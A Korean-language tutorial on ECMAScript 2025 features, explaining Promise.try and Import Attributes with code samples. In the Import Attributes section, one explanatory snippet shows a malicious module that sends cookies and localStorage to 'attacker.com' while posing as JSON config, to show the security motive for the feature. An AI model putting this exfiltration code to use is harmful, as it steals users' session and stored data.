# 🐳 ECMA Script 2025

## 🌏 Finished Proposals

* [Promise.try](https://github.com/tc39/proposal-promise-try) ✔
* [Sync Iterator helpers](https://github.com/tc39/proposal-iterator-helpers)
* [JSON Modules](https://github.com/tc39/proposal-json-modules)
* [Import Attributes](https://github.com/tc39/proposal-import-attributes)  ✔
* [RegExp Modifiers](https://github.com/tc39/proposal-regexp-modifiers)
* [New Set methods](https://github.com/tc39/proposal-set-methods)
* [Duplicate named capture groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups)

## 🌏 Promise.try

Promise체인과 try/catch를 섞어 사용하지 않고, `Promise.try`는 반환 값, Promise및 오류를 균일하게 처리합니다.

`Promise.try`는 새로운 Promise의 유틸리티이며 잠재적으로 비동기적인 함수를 더 깔끔하고 안전하게 처리할 수 있게 합니다. 최적의 실행 타이밍을 유지하면서 비동기이든 아니든 모든 함수를 promise로 래핑할 수 있습니다.

### 👉 핵심 문제

동기 또는 비동기일 수 있는 함수를 처리하려면 다양한 오류 처리 패턴을 혼합해야 합니다.

```js
function getUserData(id) {
  // We need try/catch for sync errors
  try {
    validateId(id);

    // Might return cached data synchronously
    if (id in cache) {
      return cache[id];
    }

    // Might return a Promise
    return fetch(`/api/users/${id}`);
  } catch (syncError) {
    handleSyncError(syncError);
  }
}
```

<br/>

문제는 어떤 행동을 할지 알 수없습니다.

```js
// Method 1: Using Promise.resolve().then()
Promise.resolve().then(() => getUserData(123));
// ❌ 모든 것을 비동기로 강제 실행함
// ❌ 캐시된 데이터조차 다음 Tick까지 대기해야함.
// ✓ 적어도 오류는 잡을 수 있음

// Method 2: Using new Promise
new Promise(resolve => resolve(getUserData(123)));
// ❌ 장황하고 투박
// ❌ 실수하기 쉬움
// ✓ 동기 코드를 즉시 실행함.
```

> Tick
>
> 이벤트 루프의 단위 시간이나 작업 실행의 한 사이클을 이야기함.
>
> Javascript에서 비동기 작업은 이벤트 루프에서 처리되며, 이 루프는 여러 단계로 이루어진 틱을 통해 실행됨.
>
> ```js
> console.log('A')
> setTimeout(()=>{ 
>   console.log('B') // 다음 틱에서 실행
> },[])
> console.log('C');
> 
> // A C B순서로 출력 됨.
> // A는 즉시 실행
> // setTimeout은 비동기로 실행되기 때문에 다음 틱에 실행을 예약함.
> // C는 현재 틱에서 실행됨.
> // 다음 틱에서 setTimeout이 실행.
> ```

<br/>

우리는 더 나은 방법이 필요합니다.

- 동기 코드를 즉시 실행(더 나은 성능을 위해)
- 필요할 때 비동기 코드를 처리합니다
- 발생할 수 있는 오류를 포착하세요
- 이 모든 작업을 깔끔하고 읽기 쉬운 구문으로 수행하세요.

## 👉 해결책 : Promise.try

`Promise.try`는 모든 사례를 처리하는 깔끔한 방법을 제공합니다.

```js
// Clean, safe, and optimal timing
Promise.try(() => getUserData(123))
  .then(user => {
    // Gets called with:
    // - Immediate values (from cache)
    // - Resolved Promise values (from fetch)
  })
  .catch(error => {
    // Catches both:
    // - Synchronous throws
    // - Promise rejections
  });
```

<br/>

### 👉 왜 더 나은가?

```js
// 1. 가능할 경우 동기적으로 실행됨
Promise.try(() => "instant") // 즉시 실행
  .then(x => console.log(x));

// 2. 모든 오류를 안정적으로 잡아냄
Promise.try(() => {
  throw new Error('boom');
})
  .catch(err => console.log('Caught:', err));

// 3. 동기와 비동기를 모두 자연스럽게 처리함
Promise.try(() => {
  if (Math.random() > 0.5) {
    return "sync value"; // 동기 값 반환
  }
  return fetch('/api/data'); // 비동기 작업 반환
});
```

* 동기 코드를 즉시 실행하면서 필요할 때 비동기 작업을 처리한다.
* 단일 catch핸들러를 통해 모든 유형의 오류를 포착하고, 깔끔하고 읽기 쉬운 구문으로 모든 작업을 수행한다.
* 함수가 즉시 반환하든 API호출을 해야하든 오류 처리가 일관되게 유지된다.
* 모든 것을 try-catch블록으로 래핑한 다음 Promise rejection을 별도로 처리할 필요가 없다.

<br/><br/>

## 🌏 Import Attributes

Javascript에 모듈 가져오기를 더 명확하고 안전하게 만드는 새로운 기능

Javascript또는 다른 모듈 유형 등 가져오는 모든 모듈에 대한 메타데이터를 전달하는 방법을 추가함.

<br/>

### 👉 핵심 문제

웹에서 파일 확장자는 콘텐츠를 안정적으로 나타내지 않습니다. JSON을 기대하는 경우 서버에서 Javascript를 반환할 수 있습니다.

```js
// 안전해 보이지만, 위험할 수 있음
import config from './config.json';

// 서버가 실행 가능한 코드를 반환할 수도 있음
export default (function(){
  // 예기치 않은 코드 실행
})();
```

<br/>

### 👉 해결책 : Import Attributes

`Import Attributes`는 코드와 런타임 간의 계약을 만들어, **예상하는 모듈 유형을 명시적으로 선언**합니다.

```js
// Explicitly require JSON
import config from './config.json' with { type: "json" };

// Or specify JavaScript
import module from './module.js' with { type: "javascript" };

// Works with dynamic imports too
const data = await import('./config.json', {
  with: { type: "json" }
});
```

다양한 모듈 컨텍스트에서 일관되게 작동함.

```js
// Re-exporting with attributes
export { data } from './data.json' with { type: "json" };

// Web Worker instantiation
new Worker("processor.wasm", {
  type: "module",
  with: { type: "webassembly" }
});
```

<br/>

### 👉 속성을 가져오는 이유는?

핵심 문제는 **보안**입니다. 

웹에서 파일 확장자는 콘텐츠를 안정적으로 나타내지 않고, `.json`으로 끝나는 URL은 실제로 Javascript를 제공할 수 있습니다.

```js
// API설정 로드 중
import apiConfig from './api-config.json';

// 예상되는 데이터 형식
{
  "apiKey": "secret-key",
  "endpoint": "https://api.example.com",
  "timeout": 5000
}

// 손상된 서버가 대신 보낼 수 있는 데이터
export default (function(){
  // API키를 공격자에게 전송
  fetch('https://attacker.com', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie, // 사용자의 쿠키 정보
      localStorage: window.localStorage // 로컬스토리지 정보
    })
  });

  // 그런 다음 정상적인 설정처럼 보이는 데이터를 반환
  return {
    apiKey: "secret-key",
    endpoint: "https://api.example.com",
    timeout: 5000
  }
})();
```

<br/>

❗ **`Import Attributes`는 모듈 시스템을 더 정확하고 안전하게 만듭니다.** JSON모듈은 코드를 실행할 수 없고, 순수한 데이터 입니다.

모듈을 `type: 'json'`으로 표시하면 JSON 데이터나 오류를 받게 되며, 실행 가능한 코드는 절대 나오지 않습니다.

가장 즉각적으로 보여질 영향은 보안이 중요한 JSON가져오기(`ex) config.json`)에 있습니다.

```js
// Configuration files
import config from './config.json' with { type: "json" };

// Dynamic configuration
const config = await import(
  `./config.${env}.json`,
  { with: { type: "json" }}
);
```



## 📘 참고

* [Git - TC39 Final Proposals](https://github.com/tc39/proposals/blob/main/finished-proposals.md)
* [Blog - promise try in javascript](https://www.trevorlasn.com/blog/promise-try-in-javascript)
